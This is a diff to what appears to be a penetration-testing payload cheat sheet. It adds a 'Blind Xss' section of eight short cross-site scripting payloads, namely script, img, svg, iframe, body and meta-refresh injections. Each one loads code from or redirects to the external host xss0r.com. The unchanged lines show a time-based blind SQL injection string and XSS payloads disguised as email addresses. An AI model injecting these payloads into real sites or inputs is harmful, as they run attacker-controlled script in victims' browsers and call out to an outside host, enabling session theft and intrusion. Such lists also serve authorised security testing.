@@ -28,6 +28,18 @@ Blind SQLi:
 ------------
 the0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z
 
+Blind Xss 50 Chars:
+-------------------
+"><script src=//xss0r.com/c/brocode></script>
+"><img src=x onerror=location='//xss0r.com/c/brocode'>
+"><script>fetch('//xss0r.com/c/brocode')</script>
+"><svg/onload=location='//xss0r.com/c/brocode'>
+"><iframe src=//xss0r.com/c/brocode></iframe>
+"><body onload=location='//xss0r.com/c/brocode'>
+"><a href=//xss0r.com/c/brocode>ClickMe</a>
+"><meta http-equiv="refresh" content="0;url=//xss0r.com/c/brocode">
+
+
 🔹 XSS Payloads in Email Format
 "><script>alert(1)</script>@example.com
 xss"><svg/onload=alert(1)>@test.com
